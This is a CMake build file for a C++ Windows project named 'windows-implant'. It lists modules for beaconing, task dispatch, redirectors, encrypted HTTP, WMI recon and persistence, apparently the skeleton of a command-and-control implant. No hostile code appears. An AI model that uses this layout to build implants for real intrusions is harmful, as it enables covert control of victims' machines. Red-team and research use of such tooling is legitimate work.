cmake_minimum_required(VERSION 3.20)
project(windows-implant LANGUAGES CXX)

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)

include(cmake/CompileOptions.cmake)

add_executable(main
    src/main.cpp
    src/core/ImplantId.cpp
    src/crypto/AesGcm.cpp
    src/http/WinHttpClient.cpp
    src/http/RedirectorResolver.cpp
    src/beacon/Beacon.cpp
    src/beacon/TaskDispatcher.cpp
    src/recon/WmiHelpers.cpp
    src/recon/SysInfo.cpp
    src/persistence/Persistence.cpp
)

target_include_directories(main PUBLIC external)
target_link_libraries(main bcrypt winhttp advapi32 ole32 wbemuuid)
